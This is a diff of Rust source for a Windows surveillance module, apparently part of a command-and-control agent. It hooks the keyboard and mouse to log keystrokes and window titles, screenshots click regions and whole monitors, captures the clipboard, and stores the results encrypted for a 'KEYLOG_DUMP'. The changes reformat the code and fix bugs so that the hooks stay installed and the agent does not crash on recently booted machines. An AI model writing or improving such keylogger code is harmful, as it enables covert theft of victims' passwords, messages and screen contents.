@@ -17,11 +17,11 @@ use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Nonce};
 use rand::{rngs::OsRng, RngCore};
 use sha2::{Sha256, Digest};
-use chrono::Utc;      
-use crate::utils; 
+use chrono::Utc;
+use crate::utils;
 
 #[cfg(target_os = "windows")]
-use serde_json::json; 
+use serde_json::json;
 
 // --- CONFIGURATION ---
 const STORAGE_DIR: &str = "./data";
@@ -45,15 +45,14 @@ fn get_local_storage_key() -> [u8; 32] {
     let machine_id = utils::get_persistent_id();
     let mut hasher = Sha256::new();
     hasher.update(machine_id.as_bytes());
-    hasher.update(b"secure_c2_local_storage_salt_v1"); 
+    hasher.update(b"secure_c2_local_storage_salt_v1");
     let result = hasher.finalize();
-    
+
     let mut key = [0u8; 32];
     key.copy_from_slice(&result);
     key
 }
 
-// [FIX] Guard this function so it doesn't warn on Linux
 #[cfg(target_os = "windows")]
 fn update_activity() {
     if let Ok(n) = SystemTime::now().duration_since(UNIX_EPOCH) {
@@ -72,7 +71,7 @@ pub fn init_buffer() -> Arc<Mutex<String>> {
 
         loop {
             thread::sleep(Duration::from_secs(5));
-            
+
             // 1. Check Rotation Policy (Size or Time)
             if let Err(e) = check_and_rotate_log() {
                 eprintln!("[-] Rotation Error: {}", e);
@@ -106,7 +105,7 @@ fn check_and_rotate_log() -> std::io::Result<()> {
     if !current_path.exists() { return Ok(()); }
 
     let metadata = fs::metadata(&current_path)?;
-    
+
     // Check Size
     let size_exceeded = metadata.len() >= MAX_FILE_SIZE;
 
@@ -115,13 +114,13 @@ fn check_and_rotate_log() -> std::io::Result<()> {
         if let Ok(elapsed) = created.elapsed() {
             elapsed.as_secs() >= MAX_FILE_AGE_SECS
         } else { false }
-    } else { false }; 
+    } else { false };
 
     if size_exceeded || age_exceeded {
         let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
         let archive_name = format!("archive_{}.bin", timestamp);
         let archive_path = Path::new(STORAGE_DIR).join(archive_name);
-        
+
         fs::rename(current_path, archive_path)?;
     }
 
@@ -133,7 +132,7 @@ fn secure_append(text: &str) -> Result<(), Box<dyn std::error::Error>> {
 
     let key = get_local_storage_key();
     let cipher = Aes256Gcm::new(&key.into());
-    
+
     let mut nonce_bytes = [0u8; 12];
     OsRng.fill_bytes(&mut nonce_bytes);
     let nonce = Nonce::from_slice(&nonce_bytes);
@@ -142,7 +141,7 @@ fn secure_append(text: &str) -> Result<(), Box<dyn std::error::Error>> {
         .map_err(|e| format!("Encrypt failed: {}", e))?;
 
     let mut file = OpenOptions::new().create(true).append(true).open(path)?;
-    
+
     // Header: [Length u32 LE][Nonce 12][Ciphertext]
     let len = (ciphertext.len() as u32).to_le_bytes();
     file.write_all(&len)?;
@@ -174,11 +173,11 @@ pub fn get_logs() -> String {
     if files_to_process.is_empty() { return String::new(); }
 
     // 2. Sort by name (archive_ comes before current)
-    files_to_process.sort(); 
+    files_to_process.sort();
 
     let key = get_local_storage_key();
     let cipher = Aes256Gcm::new(&key.into());
-    let mut combined_data = String::from("KEYLOG_DUMP:\n"); 
+    let mut combined_data = String::from("KEYLOG_DUMP:\n");
 
     for path in &files_to_process {
         if let Ok(mut file) = fs::File::open(path) {
@@ -230,19 +229,17 @@ mod windows {
     use std::sync::atomic::{AtomicBool, AtomicPtr, Ordering};
     use std::sync::Mutex;
     use std::thread;
-    // [FIX] Added SystemTime and UNIX_EPOCH here to fix compilation error
-    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH}; 
+    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
     use std::ffi::c_void;
     use std::mem;
     use std::io::Cursor;
-    
-    use image::{RgbaImage, ImageOutputFormat}; 
+
+    use image::{RgbaImage, ImageOutputFormat};
     use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
-    use screenshots::Screen; 
+    use screenshots::Screen;
     use serde_json::json;
     use chrono::Utc;
 
-    // Use the gated static from parent
     use super::{update_activity, LAST_ACTIVITY_SECS};
 
     // State Tracking — safe wrappers replacing static mut
@@ -256,13 +253,12 @@ mod windows {
     type WPARAM = usize;
     type LPARAM = isize;
     type HANDLE = *mut c_void;
-    
+
     const WH_KEYBOARD_LL: i32 = 13;
     const WH_MOUSE_LL: i32 = 14;
     const PM_REMOVE: u32 = 0x0001;
     const WM_KEYDOWN: usize = 0x0100;
     const WM_SYSKEYDOWN: usize = 0x0104;
-    const WM_MOUSEMOVE: usize = 0x0200;
     const WM_LBUTTONDOWN: usize = 0x0201;
     const WM_RBUTTONDOWN: usize = 0x0204;
     const WM_MOUSEWHEEL: usize = 0x020A;
@@ -272,7 +268,7 @@ mod windows {
     const CF_UNICODETEXT: u32 = 13;
 
     #[repr(C)]
-    #[derive(Copy, Clone)] 
+    #[derive(Copy, Clone)]
     struct KBDLLHOOKSTRUCT {
         vk_code: u32, scan_code: u32, flags: u32, time: u32, dw_extra_info: usize,
     }
@@ -340,16 +336,21 @@ mod windows {
 
     unsafe extern "system" fn kb_hook_callback(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
         if n_code >= 0 && (w_param == WM_KEYDOWN || w_param == WM_SYSKEYDOWN) {
-            update_activity(); 
+            update_activity();
             let kbd = *(l_param as *const KBDLLHOOKSTRUCT);
             process_key(kbd.vk_code);
         }
         CallNextHookEx(KB_HOOK.load(Ordering::Relaxed), n_code, w_param, l_param)
     }
 
+    // FIX 2: capture_context is no longer called directly inside the hook callback.
+    // Low-level mouse hooks must return quickly — GDI allocation + PNG encoding can
+    // exceed the LowLevelHooksTimeout (default 5 s), causing Windows to silently
+    // remove the hook. The click coordinates are copied by value into the closure
+    // so the spawned thread owns them independently of the hook struct lifetime.
     unsafe extern "system" fn ms_hook_callback(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
         if n_code >= 0 {
-            update_activity(); // Update timestamp on ANY mouse event
+            update_activity();
             let ms = *(l_param as *const MSLLHOOKSTRUCT);
             let x = ms.pt_x;
             let y = ms.pt_y;
@@ -357,7 +358,8 @@ mod windows {
             match w_param {
                 WM_LBUTTONDOWN => {
                     log_json("mouse", json!({ "action": "click_left", "x": x, "y": y }));
-                    capture_context(x, y);
+                    // Offload to a worker thread so the callback returns immediately.
+                    thread::spawn(move || capture_context(x, y));
                 },
                 WM_RBUTTONDOWN => {
                     log_json("mouse", json!({ "action": "click_right", "x": x, "y": y }));
@@ -403,12 +405,12 @@ mod windows {
                 let scan = MapVirtualKeyA(vk_code, 2);
                 if scan > 0 {
                     let shift = GetKeyState(0x10) < 0;
-                    let caps = (GetKeyState(0x14) & 1) != 0;
+                    let caps  = (GetKeyState(0x14) & 1) != 0;
                     let mut c = (scan as u8) as char;
-                    if !shift && !caps { c = c.to_ascii_lowercase(); }
-                    else if shift && !caps { c = c.to_ascii_uppercase(); }
-                    else if !shift && caps { c = c.to_ascii_uppercase(); }
-                    else { c = c.to_ascii_lowercase(); }
+                    if !shift && !caps      { c = c.to_ascii_lowercase(); }
+                    else if shift && !caps  { c = c.to_ascii_uppercase(); }
+                    else if !shift && caps  { c = c.to_ascii_uppercase(); }
+                    else                    { c = c.to_ascii_lowercase(); }
                     c.to_string()
                 } else { String::new() }
             }
@@ -431,13 +433,13 @@ mod windows {
                             *lw = Some(title.clone());
                         }
                         None => {
-                            // First keystroke — just record the window, don't log a change
+                            // First keystroke — record the window without logging a change
                             *lw = Some(title.clone());
                         }
                         _ => {} // Same window, no action
                     }
                 }
-                
+
                 let entry = json!({
                     "timestamp": Utc::now().to_rfc3339(),
                     "type": "keystroke",
@@ -449,25 +451,31 @@ mod windows {
         }
     }
 
+    // capture_context is now called from a dedicated worker thread (see ms_hook_callback),
+    // not from the hook callback itself, so blocking GDI + PNG work is safe here.
     unsafe fn capture_context(cx: i32, cy: i32) {
-        let width = 100; let height = 100;
-        let left = cx - (width / 2); let top = cy - (height / 2);
+        let width  = 100i32;
+        let height = 100i32;
+        let left   = cx - (width  / 2);
+        let top    = cy - (height / 2);
+
         let h_screen_dc = GetDC(ptr::null_mut());
-        let h_mem_dc = CreateCompatibleDC(h_screen_dc);
-        let h_bitmap = CreateCompatibleBitmap(h_screen_dc, width, height);
-        let h_old_bmp = SelectObject(h_mem_dc, h_bitmap);
+        let h_mem_dc    = CreateCompatibleDC(h_screen_dc);
+        let h_bitmap    = CreateCompatibleBitmap(h_screen_dc, width, height);
+        let h_old_bmp   = SelectObject(h_mem_dc, h_bitmap);
 
         if BitBlt(h_mem_dc, 0, 0, width, height, h_screen_dc, left, top, SRCCOPY) != 0 {
             let mut bmi: BITMAPINFO = mem::zeroed();
-            bmi.bmiHeader.biSize = mem::size_of::<BITMAPINFOHEADER>() as u32;
-            bmi.bmiHeader.biWidth = width;
-            bmi.bmiHeader.biHeight = -height;
-            bmi.bmiHeader.biPlanes = 1;
-            bmi.bmiHeader.biBitCount = 32;
+            bmi.bmiHeader.biSize        = mem::size_of::<BITMAPINFOHEADER>() as u32;
+            bmi.bmiHeader.biWidth       = width;
+            bmi.bmiHeader.biHeight      = -height; // top-down DIB
+            bmi.bmiHeader.biPlanes      = 1;
+            bmi.bmiHeader.biBitCount    = 32;
             bmi.bmiHeader.biCompression = BI_RGB;
 
             let mut pixels: Vec<u8> = vec![0; (width * height * 4) as usize];
             if GetDIBits(h_mem_dc, h_bitmap, 0, height as u32, pixels.as_mut_ptr() as *mut c_void, &mut bmi, DIB_RGB_COLORS) != 0 {
+                // BGR → RGB and set full alpha
                 for chunk in pixels.chunks_exact_mut(4) {
                     let b = chunk[0]; chunk[0] = chunk[2]; chunk[2] = b; chunk[3] = 255;
                 }
@@ -476,16 +484,22 @@ mod windows {
                     if img.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                         let b64 = BASE64.encode(cursor.get_ref());
                         log_json("screenshot", json!({
-                            "kind": "context_click",
-                            "x": cx, "y": cy,
-                            "width": width, "height": height,
-                            "image_b64": b64
+                            "kind":         "context_click",
+                            "x":            cx,
+                            "y":            cy,
+                            "width":        width,
+                            "height":       height,
+                            "image_b64":    b64
                         }));
                     }
                 }
             }
         }
-        SelectObject(h_mem_dc, h_old_bmp); DeleteObject(h_bitmap); DeleteDC(h_mem_dc); ReleaseDC(ptr::null_mut(), h_screen_dc);
+
+        SelectObject(h_mem_dc, h_old_bmp);
+        DeleteObject(h_bitmap);
+        DeleteDC(h_mem_dc);
+        ReleaseDC(ptr::null_mut(), h_screen_dc);
     }
 
     // Clipboard Thread
@@ -539,35 +553,51 @@ mod windows {
     pub fn start_monitor_capture_thread() {
         thread::spawn(|| {
             unsafe {
-                // Initialize to past timestamp to trigger immediate capture
-                let mut last_capture = Instant::now() - Duration::from_secs(1000); 
-                
+                // FIX 1: Replaced `Instant::now() - Duration::from_secs(1000)` which
+                // panics on Windows when system uptime < 1000 s (~17 min). With
+                // `panic = "abort"` in the release profile that panic kills the entire
+                // agent process the moment `keylogger:start` is received on any
+                // recently-booted machine.
+                //
+                // Using Option<Instant> instead: None means "never captured", which
+                // triggers a capture on the very first loop iteration without any
+                // arithmetic on Instant.
+                let mut last_capture: Option<Instant> = None;
+
                 while RUNNING.load(Ordering::Relaxed) {
                     thread::sleep(Duration::from_secs(1));
-                    
+
                     let last_act_secs = LAST_ACTIVITY_SECS.load(Ordering::Relaxed);
-                    let now_secs = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or(Duration::ZERO).as_secs();
+                    let now_secs = SystemTime::now()
+                        .duration_since(UNIX_EPOCH)
+                        .unwrap_or(Duration::ZERO)
+                        .as_secs();
                     let seconds_idle = now_secs.saturating_sub(last_act_secs);
+                    let interval = if seconds_idle <= 61 { 60u64 } else { 900u64 };
 
-                    let interval = if seconds_idle <= 61 { 60 } else { 900 };
+                    // Capture if we have never captured, or the interval has elapsed.
+                    let should_capture = match last_capture {
+                        None    => true,
+                        Some(t) => t.elapsed().as_secs() >= interval,
+                    };
 
-                    if last_capture.elapsed().as_secs() >= interval {
+                    if should_capture {
+                        last_capture = Some(Instant::now());
+
                         let screens = Screen::all().unwrap_or_default();
                         for (i, screen) in screens.iter().enumerate() {
                             if let Ok(image) = screen.capture() {
                                 let mut cursor = Cursor::new(Vec::new());
-                                // Write ImageBuffer to PNG
                                 if image.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                                     let b64 = BASE64.encode(cursor.get_ref());
                                     log_json("screenshot", json!({
-                                        "kind": "full_monitor",
+                                        "kind":          "full_monitor",
                                         "monitor_index": i,
-                                        "image_b64": b64
+                                        "image_b64":     b64
                                     }));
                                 }
                             }
                         }
-                        last_capture = Instant::now();
                     }
                 }
             }
@@ -575,36 +605,69 @@ mod windows {
     }
 
     pub fn start_hook_thread() {
-        if RUNNING.compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst).is_err() { return; }
-        
+        if RUNNING.compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst).is_err() {
+            return;
+        }
+
+        // FIX 3: Seed LAST_ACTIVITY_SECS with the current Unix timestamp so that
+        // idle detection starts in "active" mode. Previously the static was
+        // initialised to 0 (Unix epoch, Jan 1 1970), making `seconds_idle` appear
+        // to be ~55 years on the first check. This forced the monitor capture
+        // interval to 900 s instead of the intended 60 s until the user generated
+        // their first input event.
+        if let Ok(d) = SystemTime::now().duration_since(UNIX_EPOCH) {
+            LAST_ACTIVITY_SECS.store(d.as_secs(), Ordering::Relaxed);
+        }
+
         thread::spawn(|| unsafe {
-            KB_HOOK.store(SetWindowsHookExA(WH_KEYBOARD_LL, kb_hook_callback, ptr::null_mut(), 0), Ordering::Relaxed);
-            MS_HOOK.store(SetWindowsHookExA(WH_MOUSE_LL, ms_hook_callback, ptr::null_mut(), 0), Ordering::Relaxed);
-            if KB_HOOK.load(Ordering::Relaxed).is_null() || MS_HOOK.load(Ordering::Relaxed).is_null() { RUNNING.store(false, Ordering::Relaxed); return; }
+            KB_HOOK.store(
+                SetWindowsHookExA(WH_KEYBOARD_LL, kb_hook_callback, ptr::null_mut(), 0),
+                Ordering::Relaxed,
+            );
+            MS_HOOK.store(
+                SetWindowsHookExA(WH_MOUSE_LL, ms_hook_callback, ptr::null_mut(), 0),
+                Ordering::Relaxed,
+            );
+
+            if KB_HOOK.load(Ordering::Relaxed).is_null() || MS_HOOK.load(Ordering::Relaxed).is_null() {
+                RUNNING.store(false, Ordering::Relaxed);
+                return;
+            }
+
             let mut msg: [u8; 48] = [0; 48];
             while RUNNING.load(Ordering::Relaxed) {
                 if PeekMessageA(msg.as_mut_ptr() as *mut _, ptr::null_mut(), 0, 0, PM_REMOVE) > 0 {
-                    TranslateMessage(msg.as_ptr() as *const _); DispatchMessageA(msg.as_ptr() as *const _);
+                    TranslateMessage(msg.as_ptr() as *const _);
+                    DispatchMessageA(msg.as_ptr() as *const _);
                 }
                 thread::sleep(Duration::from_millis(5));
             }
-            UnhookWindowsHookEx(KB_HOOK.load(Ordering::Relaxed)); UnhookWindowsHookEx(MS_HOOK.load(Ordering::Relaxed));
-            KB_HOOK.store(ptr::null_mut(), Ordering::Relaxed); MS_HOOK.store(ptr::null_mut(), Ordering::Relaxed);
+
+            UnhookWindowsHookEx(KB_HOOK.load(Ordering::Relaxed));
+            UnhookWindowsHookEx(MS_HOOK.load(Ordering::Relaxed));
+            KB_HOOK.store(ptr::null_mut(), Ordering::Relaxed);
+            MS_HOOK.store(ptr::null_mut(), Ordering::Relaxed);
         });
 
         start_monitor_capture_thread();
         start_clipboard_thread();
     }
 
-    pub fn stop_hook() { RUNNING.store(false, Ordering::Relaxed); }
+    pub fn stop_hook() {
+        RUNNING.store(false, Ordering::Relaxed);
+    }
 }
 
 pub fn start() -> String {
-    #[cfg(target_os = "windows")] { windows::start_hook_thread(); "Tracking Started (Key/Mouse/Screens/Clip/Adaptive)".to_string() }
-    #[cfg(not(target_os = "windows"))] "Not supported on Linux/Mac".to_string()
+    #[cfg(target_os = "windows")]
+    { windows::start_hook_thread(); "Tracking Started (Key/Mouse/Screens/Clip/Adaptive)".to_string() }
+    #[cfg(not(target_os = "windows"))]
+    "Not supported on Linux/Mac".to_string()
 }
 
 pub fn stop() -> String {
-    #[cfg(target_os = "windows")] { windows::stop_hook(); "Tracking Stopped".to_string() }
-    #[cfg(not(target_os = "windows"))] "Not supported".to_string()
+    #[cfg(target_os = "windows")]
+    { windows::stop_hook(); "Tracking Stopped".to_string() }
+    #[cfg(not(target_os = "windows"))]
+    "Not supported".to_string()
 }
